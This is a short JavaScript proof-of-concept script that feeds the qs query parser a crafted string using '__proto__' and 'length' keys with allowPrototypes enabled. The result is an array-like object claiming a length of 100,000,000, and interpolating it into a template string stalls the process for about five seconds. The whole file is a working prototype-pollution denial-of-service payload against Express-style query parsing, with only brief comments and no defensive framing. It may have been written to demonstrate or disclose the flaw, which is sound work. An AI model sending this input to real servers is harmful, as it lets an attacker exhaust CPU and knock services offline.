const qs = require("qs");
{
	
	// using the default express configuration :
	console.log('Using the default express configuration : \n');
	console.log('qs.parse("someValue[__proto__]=login&someValue[__proto__]&someValue[length]=100000000", { allowPrototypes: true })');
	
	let query     = qs.parse("someValue[__proto__]=login&someValue[__proto__]&someValue[length]=100000000", { allowPrototypes: true }),
	    stringBomb = query.someValue;
	
	console.log('stringBomb value : ', stringBomb);
	/*
	 stringBomb === Array { length: '100000000' }
	 
	 internal structure :
	 {
	 length    : '100000000',
	 __proto__ : ['login', '']
	 }
	 */
	
	console.log("Do `${stringBomb} !`...");
	console.time("Do `${stringBomb} !`...");
	`${stringBomb} !`// this will take ~5s
	console.timeEnd("Do `${stringBomb} !`...");
}
